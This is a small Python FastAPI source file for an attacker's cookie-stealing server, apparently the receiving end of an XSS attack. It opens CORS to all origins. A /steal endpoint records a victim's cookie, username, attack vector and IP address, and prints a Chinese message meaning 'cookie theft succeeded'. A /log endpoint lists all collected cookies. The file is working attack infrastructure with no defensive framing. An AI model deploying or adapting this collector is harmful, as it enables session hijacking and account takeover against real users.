from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

stolen_cookies: list[dict] = []


@app.get("/steal")
def steal(c: str = "", via: str = "xss", user: str = "", request: Request = None):
    entry = {
        "cookie": c,
        "via": via,
        "user": user,
        "ip": request.client.host,
    }
    stolen_cookies.append(entry)
    print(f"[!!!] Cookie窃取成功 | via={via} user={user} cookie={c}")
    return {"status": "ok"}


@app.get("/log")
def show_log():
    return {"stolen": stolen_cookies}
